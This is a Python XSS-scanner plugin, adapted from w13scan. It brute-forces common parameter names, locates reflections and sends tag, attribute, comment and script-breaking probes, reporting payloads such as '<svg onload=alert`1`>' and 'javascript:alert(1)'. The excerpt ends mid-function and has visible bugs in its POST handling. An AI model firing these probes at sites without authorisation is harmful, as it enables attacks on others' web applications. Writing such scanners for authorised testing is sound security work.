#!/usr/bin/python
# coding=utf-8
'''
Date: 2022-03-30 16:12:12
LastEditors: recar
LastEditTime: 2022-03-31 15:43:08
'''


from plugins.scan import Base
from lib.utils import Utils
from lib.html_parse import SearchInputInResponse, random_upper
from lib.jscontext import SearchInputInScript
from lib.http_parser import HTTPParser
import json
import copy

'''
## 位置与payload需要的字符串

| 属性         | 必选                                                | 可选                       |
| ------------ | --------------------------------------------------- | -------------------------- |
| HTML标签     | <>                                                  |                            |
| HTML属性     | 空格和等于号(=)                                     | 单引号(')和双引号(")是可选 |
| HTML属性值   | 直接有效的Payload或者需要逗号(,)                    |                            |
| HTML文本节点 | <> 字符需要转义文本区域                             |                            |
| HTML注释     | <>!字符必须用来转义注释                             |                            |
| Style        | <> 需要转义样式                                     |                            |
| Style 属性   | <,>,"字符需要转义文本                               |                            |
| Href 属性    | 直接构造payload，或者“需要转义文本                  |                            |
| JS 节点      | <,>需要转义script，其他特殊的字符来闭合JS变量或函数 |                            |

参考 https://mp.weixin.qq.com/s?__biz=MzU2NzcwNTY3Mg==&mid=2247483698&idx=1&sn=9733c6078516c34963a4c0486c6d1872&chksm=fc986815cbefe103975c2e554ef2667b931e14b2d1dcca407af9edbad83ea72f3ac88efd8d22&mpshare=1&scene=1&srcid=&sharer_sharetime=1588849508551&sharer_shareid=19604935512cdb60a84a4a498605fc8d&key=e4739a048b456af8bbf436c6fb2173754f53fcd63e766a439186e0a2433cd084a69e23876cc446623cb005c3c9fed06af918b7b082f604e7a23c136961d5a1e633f4a60b65b241dea730f7c13578ea94&ascene=1&uin=MTM3MzQ3ODE0MA%3D%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=AZ%2F8pd18PHTzKD6ytyi7PPk%3D&pass_ticket=ssxjxDrN0aRCdy2TGXV37%2Bg0cYgtEknB95Y1dXjxGOtpxjCYC6wfPOq5QXvs3lzE
https://brutelogic.com.br/knoxss.html

'''
# 隐藏参数
# TOP_RISK_GET_PARAMS = {"id", 'action', 'type', 'm', 'callback', 'cb'}
blindParams = [  # common paramtere names to be bruteforced for parameter discovery
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message', 'id', 'action', 'type', 'm', 'callback', 'cb']

'''

'''

BLIND_PARAMS = [  # common paramtere names to be bruteforced for parameter discovery
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message', 'id', 'action', 'type', 'm', 'callback', 'cb']

XSS_EVAL_ATTITUDES = ['onbeforeonload', 'onsubmit', 'ondragdrop', 'oncommand', 'onbeforeeditfocus', 'onkeypress',
                      'onoverflow', 'ontimeupdate', 'onreset', 'ondragstart', 'onpagehide', 'onunhandledrejection',
                      'oncopy',
                      'onwaiting', 'onselectstart', 'onplay', 'onpageshow', 'ontoggle', 'oncontextmenu', 'oncanplay',
                      'onbeforepaste', 'ongesturestart', 'onafterupdate', 'onsearch', 'onseeking',
                      'onanimationiteration',
                      'onbroadcast', 'oncellchange', 'onoffline', 'ondraggesture', 'onbeforeprint', 'onactivate',
                      'onbeforedeactivate', 'onhelp', 'ondrop', 'onrowenter', 'onpointercancel', 'onabort',
                      'onmouseup',
                      'onbeforeupdate', 'onchange', 'ondatasetcomplete', 'onanimationend', 'onpointerdown',
                      'onlostpointercapture', 'onanimationcancel', 'onreadystatechange', 'ontouchleave',
                      'onloadstart',
                      'ondrag', 'ontransitioncancel', 'ondragleave', 'onbeforecut', 'onpopuphiding', 'onprogress',
                      'ongotpointercapture', 'onfocusout', 'ontouchend', 'onresize', 'ononline', 'onclick',
                      'ondataavailable', 'onformchange', 'onredo', 'ondragend', 'onfocusin', 'onundo', 'onrowexit',
                      'onstalled', 'oninput', 'onmousewheel', 'onforminput', 'onselect', 'onpointerleave', 'onstop',
                      'ontouchenter', 'onsuspend', 'onoverflowchanged', 'onunload', 'onmouseleave',
                      'onanimationstart',
                      'onstorage', 'onpopstate', 'onmouseout', 'ontransitionrun', 'onauxclick', 'onpointerenter',
                      'onkeydown', 'onseeked', 'onemptied', 'onpointerup', 'onpaste', 'ongestureend', 'oninvalid',
                      'ondragenter', 'onfinish', 'oncut', 'onhashchange', 'ontouchcancel', 'onbeforeactivate',
                      'onafterprint', 'oncanplaythrough', 'onhaschange', 'onscroll', 'onended', 'onloadedmetadata',
                      'ontouchmove', 'onmouseover', 'onbeforeunload', 'onloadend', 'ondragover', 'onkeyup',
                      'onmessage',
                      'onpopuphidden', 'onbeforecopy', 'onclose', 'onvolumechange', 'onpropertychange', 'ondblclick',
                      'onmousedown', 'onrowinserted', 'onpopupshowing', 'oncommandupdate', 'onerrorupdate',
                      'onpopupshown',
                      'ondurationchange', 'onbounce', 'onerror', 'onend', 'onblur', 'onfilterchange', 'onload',
                      'onstart',
                      'onunderflow', 'ondragexit', 'ontransitionend', 'ondeactivate', 'ontouchstart', 'onpointerout',
                      'onpointermove', 'onwheel', 'onpointerover', 'onloadeddata', 'onpause', 'onrepeat',
                      'onmouseenter',
                      'ondatasetchanged', 'onbegin', 'onmousemove', 'onratechange', 'ongesturechange',
                      'onlosecapture',
                      'onplaying', 'onfocus', 'onrowsdelete']

class Scan(Base):
    def __init__(self, report_work):
        super().__init__(report_work)
        self.plugins_name = "xss"


    def test_echo(self, url_info):
        echo_query_list = list()
        query_dict = copy.copy(url_info.get("query_dict"))
        headers = url_info.get("headers")
        method = url_info.get("method")
        base_url = url_info.get("base_url")
        origin_url = url_info.get("origin_url")
        # 混合测试的参数
        query_list = list(query_dict.keys())+BLIND_PARAMS
        for query in query_list:
            query_dict[query] = Utils.gen_random_str()
        #url
        data = None
        if method=="GET":
            fix_query_str = ""
            for key,value in query_dict.items():
                fix_query_str += key + "=" + value+"&"
            if fix_query_str.endswith("&"):
                fix_query_str = fix_query_str[:-1]
            if "?" in origin_url:
                origin_query  = origin_url.split("?")[-1]
                url = origin_url.replace(origin_query, fix_query_str)
            else:
                # 隐藏参数
                finx_query_str = "?"
                for query in query_dict:
                    finx_query_str += query + "=" + query_dict[query][0]+"&"
                if finx_query_str.endswith("&"):
                    finx_query_str = finx_query_str[:-1]
                url = origin_url+"?"+finx_query_str
        else: # post
            url = base_url
            if url_info.get("json"):
                # 如果是json的
                data = json.dumps(query_dict)
            else:
                # 普通post的
                data = ""
                for key,value in query_dict.items():
                    data += key + "=" + value+"&"
                if data.endswith("&"):
                    data = data[:-1]
        # 发送请求
        response = self.request(url, method=method, data=data, headers=headers, timeout=10)
        for key, value in query_dict.items():
            if value in response.text:
                self.logger.debug("find echo key: {0}".format(key))
                locations = SearchInputInResponse( value, response.text)
                self.logger.debug("locations: {0}".format(locations))
                if locations:
                    echo_query_list.append({
                        "key": key,
                        "value": value,
                        "locations": locations
                    })
        return echo_query_list


    def fix_query_get_response(self, url_info, echo_query, payload):
        query_dict = url_info.get("query_dict")
        headers = url_info.get("headers")
        method = url_info.get("method")
        base_url = url_info.get("base_url")
        origin_url = url_info.get("origin_url")
        if echo_query in query_dict.keys():
            origin_query = echo_query+"="+query_dict[echo_query][0]
            payload_query = echo_query+"="+payload
        else:
            # 隐藏参数
            origin_query = ""
            for query in query_dict:
                origin_query += query + "=" + query_dict[query][0]+"&"
            if origin_query.endswith("&"):
                origin_query = origin_query[:-1]
            payload_query = origin_query+"&"+echo_query+"="+payload
        self.logger.debug("origin_url: {0}".format(origin_url))
        self.logger.debug("origin_query: {0}".format(origin_query))
        self.logger.debug("payload_query: {0}".format(payload_query))
        #url
        if method=="GET":
            url = origin_url.replace(origin_query, payload_query)
            self.logger.debug("url: {0}".format(url))
        else: # post
            url = base_url
            if url_info.get("json"):
                # 如果是json的
                query_dict[echo_query] = payload
                data = json.dumps(query_dict)
            else:
                # 普通post的
                data.replace(origin_query, payload_query)
        return self.request(url, method=method, headers=headers)

    def verify(self, url_info, req, rsp, violent=False):
        '''
        xss 检测
        copy https://github.com/w-digital-scanner/w13scan/blob/master/W13SCAN/scanners/PerFile/xss.py
        '''

        echo_query_list = self.test_echo(url_info)
        if len(echo_query_list)==0:
            return 
        for echo_query_info in echo_query_list:
            locations = echo_query_info.get('locations')
            echo_query = echo_query_info.get("key")
            xsschecker = echo_query_info.get('value')
            if not locations:
                continue
            for item in locations:
                _type = item["type"]
                details = item["details"]
                if _type == "html":
                    if details["tagname"] == "style":
                        payload = "expression(a({}))".format(Utils.gen_random_str())
                        response = self.fix_query_get_response(url_info, echo_query, payload)
                        _locations = SearchInputInResponse(payload, response.text)
                        for _item in _locations:
                            if payload in _item["details"]["content"] and _item["details"]["tagname"] == "style":
                                result = {
                                "plugins": self.plugins_name,
                                "url": url_info.get("origin_url"),
                                "req": HTTPParser.rsp_to_reqtext(response),
                                "payload": echo_query+"="+payload,
                                "desc": "可能存在xss E下可执行的表达式 expression(alert(1))"
                                }
                                self.print_result(result)
                                self.to_result(result)
                                break
                    flag = Utils.gen_random_str(7)
                    payload = "</{}><{}>".format(random_upper(details["tagname"]), flag)
                    truepayload = "</{}>{}".format(random_upper(details["tagname"]), "<svg onload=alert`1`>")
                    response = self.fix_query_get_response(url_info, echo_query, payload)
                    _locations = SearchInputInResponse(flag, response.text)
                    for i in _locations:
                        if i["details"]["tagname"] == flag:
                                result = {
                                "plugins": self.plugins_name,
                                "url": url_info.get("origin_url"),
                                "req": HTTPParser.rsp_to_reqtext(response),
                                "payload": echo_query+"="+payload,
                                "desc": "html标签可被闭合: {0}".format(truepayload)
                                }
                                self.print_result(result)
                                self.to_result(result)
                                break                                                    
                elif _type == "attibute":
                    if details["content"] == "key":
                        # test html
                        flag = Utils.gen_random_str(7)
                        payload = "><{} ".format(flag)
                        truepayload = "><svg onload=alert`1`>"
                        response = self.fix_query_get_response(url_info, echo_query, payload)
                        _locations = SearchInputInResponse(flag, response.text)
                        for i in _locations:
                            if i["details"]["tagname"] == flag:
                                result = {
                                "plugins": self.plugins_name,
                                "url": url_info.get("origin_url"),
                                "req": HTTPParser.rsp_to_reqtext(response),
                                "payload": echo_query+"="+payload,
                                "desc": "html标签可被闭合: {0}".format(truepayload)
                                }
                                self.print_result(result)
                                self.to_result(result)
                                break  
                        # test attibutes
                        flag = Utils.gen_random_str(5)
                        payload = flag + "="
                        response = self.fix_query_get_response(url_info, echo_query, payload)
                        _locations = SearchInputInResponse(flag, response.text)
                        for i in _locations:
                            for _k, v in i["details"]["attibutes"]:
                                if _k == flag:
                                    result = {
                                    "plugins": self.plugins_name,
                                    "url": url_info.get("origin_url"),
                                    "req": HTTPParser.rsp_to_reqtext(response),
                                    "payload": echo_query+"="+payload,
                                    "desc": "可以自定义类似 'onmouseover=prompt(1)'的标签事件"
                                    }
                                    self.print_result(result)
                                    self.to_result(result)
                                    break  
                    else:
                        # test attibutes
                        flag = Utils.gen_random_str(5)
                        for _payload in ["'", "\"", " "]:
                            payload = _payload + flag + "=" + _payload
                            truepayload = "{payload} onmouseover=prompt(1){payload}".format(payload=_payload)
                            response = self.fix_query_get_response(url_info, echo_query, payload)
                            _occerens = SearchInputInResponse(flag, response.text)
                            for i in _occerens:
                                for _k, _v in i["details"]["attibutes"]:
                                    if _k == flag:
                                        result = {
                                        "plugins": self.plugins_name,
                                        "url": url_info.get("origin_url"),
                                        "req": HTTPParser.rsp_to_reqtext(response),
                                        "payload": echo_query+"="+payload,
                                        "desc": "引号可被闭合，可使用其他事件造成xss: {0}".format(truepayload)
                                        }
                                        self.print_result(result)
                                        self.to_result(result)
                                        break  
                        # test html
                        flag = Utils.gen_random_str(7)
                        for _payload in [r"'><{}>", "\"><{}>", "><{}>"]:
                            payload = _payload.format(flag)
                            response = self.fix_query_get_response(url_info, echo_query, payload)
                            _occerens = SearchInputInResponse(flag, response.text)
                            for i in _occerens:
                                if i["details"]["tagname"] == flag:
                                    result = {
                                    "plugins": self.plugins_name,
                                    "url": url_info.get("origin_url"),
                                    "req": HTTPParser.rsp_to_reqtext(response),
                                    "payload": echo_query+"="+payload,
                                    "desc": "html标签可被闭合: {0}".format(_payload.format("svg onload=alert`1`"))
                                    }
                                    self.print_result(result)
                                    self.to_result(result)
                                    break  
                        # 针对特殊属性进行处理
                        specialAttributes = ['srcdoc', 'src', 'action', 'data', 'href']  # 特殊处理属性
                        keyname = details["attibutes"][0][0]
                        tagname = details["tagname"]
                        if keyname in specialAttributes:
                            flag = Utils.gen_random_str(7)
                            response = self.fix_query_get_response(url_info, echo_query, payload)
                            _occerens = SearchInputInResponse(flag, response.text)
                            for i in _occerens:
                                if len(i["details"]["attibutes"]) > 0 and i["details"]["attibutes"][0][
                                    0] == keyname and \
                                        i["details"]["attibutes"][0][1] == flag:
                                    truepayload = flag
                                    if i["details"]["attibutes"][0][0] in specialAttributes:
                                        truepayload = "javascript:alert(1)"
                                    result = {
                                    "plugins": self.plugins_name,
                                    "url": url_info.get("origin_url"),
                                    "req": HTTPParser.rsp_to_reqtext(response),
                                    "payload": echo_query+"="+payload,
                                    "desc": "{0}的值可控，可能被恶意攻击,payload:{1}".format(keyname, truepayload)
                                    }
                                    self.print_result(result)
                                    self.to_result(result)
                                    break  
                        elif keyname == "style":
                            payload = "expression(a({}))".format(Utils.gen_random_str(6))
                            response = self.fix_query_get_response(url_info, echo_query, payload)
                            _occerens = SearchInputInResponse(payload, response.text)
                            for _item in _occerens:
                                if payload in str(_item["details"]) and len(_item["details"]["attibutes"]) > 0 and \
                                        _item["details"]["attibutes"][0][0] == keyname:
                                    result = {
                                    "plugins": self.plugins_name,
                                    "url": url_info.get("origin_url"),
                                    "req": HTTPParser.rsp_to_reqtext(response),
                                    "payload": echo_query+"="+payload,
                                    "desc": "IE下可执行的表达式 payload:expression(alert(1))"
                                    }
                                    self.print_result(result)
                                    self.to_result(result)
                                    break  
                        elif keyname.lower() in XSS_EVAL_ATTITUDES:
                            # 在任何可执行的属性中
                            payload = Utils.gen_random_str(6)
                            response = self.fix_query_get_response(url_info, echo_query, payload)
                            _occerens = SearchInputInResponse(payload, response.text)
                            for i in _occerens:
                                _attibutes = i["details"]["attibutes"]
                                if len(_attibutes) > 0 and _attibutes[0][1] == payload and _attibutes[0][
                                    0].lower() == keyname.lower():
                                    result = {
                                    "plugins": self.plugins_name,
                                    "url": url_info.get("origin_url"),
                                    "req": HTTPParser.rsp_to_reqtext(response),
                                    "payload": echo_query+"="+payload,
                                    "desc": "{0}的值可控，可能被恶意攻击".format(keyname)
                                    }
                                    self.print_result(result)
                                    self.to_result(result)
                                    break                                      
                elif _type == "comment":
                    flag = Utils.gen_random_str(7)
                    for _payload in ["-->", "--!>"]:
                        payload = "{}<{}>".format(_payload, flag)
                        truepayload = payload.format(_payload, "svg onload=alert`1`")
                        response = self.fix_query_get_response(url_info, echo_query, payload)
                        _occerens = SearchInputInResponse(flag, response.text)
                        for i in _occerens:
                            if i["details"]["tagname"] == flag:
                                result = {
                                "plugins": self.plugins_name,
                                "url": url_info.get("origin_url"),
                                "req": HTTPParser.rsp_to_reqtext(response),
                                "payload": echo_query+"="+payload,
                                "desc": "html注释可被闭合 测试payload:{0}".format(truepayload)
                                }
                                self.print_result(result)
                                self.to_result(result)
                                break                                  
                elif _type == "script":
                    # test html
                    flag = Utils.gen_random_str(7)
                    script_tag = random_upper(details["tagname"])
                    payload = "</{}><{}>{}</{}>".format(script_tag,
                                                        script_tag, flag,
                                                        script_tag)
                    truepayload = "</{}><{}>{}</{}>".format(script_tag,
                                                            script_tag, "prompt(1)",
                                                            script_tag)
                    response = self.fix_query_get_response(url_info, echo_query, payload)
                    _occerens = SearchInputInResponse(flag, req.text)
                    for i in _occerens:
                        if i["details"]["content"] == flag and i["details"][
                            "tagname"].lower() == script_tag.lower():
                            result = {
                            "plugins": self.plugins_name,
                            "url": url_info.get("origin_url"),
                            "req": HTTPParser.rsp_to_reqtext(response),
                            "payload": echo_query+"="+payload,
                            "desc": "可以新建script标签执行任意代码 测试payload:{0}".format(truepayload)
                            }
                            self.print_result(result)
                            self.to_result(result)
                            break                              

                    # js 语法树分析反射
                    source = details["content"]
                    _occurences = SearchInputInScript(xsschecker, source)
                    for i in _occurences:
                        _type = i["type"]
                        _details = i["details"]
                        if _type == "InlineComment":
                            flag = Utils.gen_random_str(5)
                            payload = "\n;{};//".format(flag)
                            truepayload = "\n;{};//".format('prompt(1)')
                            response = self.fix_query_get_response(url_info, echo_query, payload)
                            for _item in SearchInputInResponse(flag, response.text):
                                if _item["details"]["tagname"] != "script":
                                    continue
                                resp2 = _item["details"]["content"]
                                output = SearchInputInScript(flag, resp2)
                                for _output in output:
                                    if flag in _output["details"]["content"] and _output[
                                        "type"] == "ScriptIdentifier":
                                        result = {
                                        "plugins": self.plugins_name,
                                        "url": url_info.get("origin_url"),
                                        "req": HTTPParser.rsp_to_reqtext(response),
                                        "payload": echo_query+"="+payload,
                                        "desc": "js单行注释可被\\n bypass"
                                        }
                                        self.print_result(result)
                                        self.to_result(result)
                                        break

                        elif _type == "BlockComment":
                            flag = "0x" + Utils.gen_random_str(4)
                            payload = "*/{};/*".format(flag)
                            truepayload = "*/{};/*".format('prompt(1)')
                            response = self.fix_query_get_response(url_info, echo_query, payload)
                            for _item in SearchInputInResponse(flag, response.text):
                                if _item["details"]["tagname"] != "script":
                                    continue
                                resp2 = _item["details"]["content"]
                                output = SearchInputInScript(flag, resp2)
                                for _output in output:
                                    if flag in _output["details"]["content"] and _output[
                                        "type"] == "ScriptIdentifier":
                                        result = {
                                        "plugins": self.plugins_name,
                                        "url": url_info.get("origin_url"),
                                        "req": HTTPParser.rsp_to_reqtext(response),
                                        "payload": echo_query+"="+payload,
                                        "desc": "js单行注释可被\\n bypass"
                                        }
                                        self.print_result(result)
                                        self.to_result(result)
                                        break
                        elif _type == "ScriptIdentifier":
                            result = {
                            "plugins": self.plugins_name,
                            "url": url_info.get("origin_url"),
                            "req": HTTPParser.rsp_to_reqtext(response),
                            "payload": echo_query+"="+payload,
                            "desc": "ScriptIdentifier类型 测试payload：prompt(1);"
                            }
                            self.print_result(result)
                            self.to_result(result)
                            break                                                
                        elif _type == "ScriptLiteral":
                            content = _details["content"]
                            quote = content[0]
                            flag = Utils.gen_random_str(6)
                            if quote == "'" or quote == "\"":
                                payload = '{quote}-{rand}-{quote}'.format(quote=quote, rand=flag)
                                truepayload = '{quote}-{rand}-{quote}'.format(quote=quote, rand="prompt(1)")
                            else:
                                flag = "0x" + Utils.gen_random_str(4)
                                payload = flag
                                truepayload = "prompt(1)"
                            response = self.fix_query_get_response(url_info, echo_query, payload)
                            resp2 = None
                            for _item in SearchInputInResponse(payload, response.text):
                                if payload in _item["details"]["content"] and _item["type"] == "script":
                                    resp2 = _item["details"]["content"]

                            if not resp2:
                                continue
                            output = SearchInputInScript(flag, resp2)

                            if output:
                                for _output in output:
                                    if flag in _output["details"]["content"] and _output[
                                        "type"] == "ScriptIdentifier":
                                        result = {
                                        "plugins": self.plugins_name,
                                        "url": url_info.get("origin_url"),
                                        "req": HTTPParser.rsp_to_reqtext(response),
                                        "payload": echo_query+"="+payload,
                                        "desc": "script脚本内容可被任意设置 测试payload:{0}".format(truepayload)
                                        }
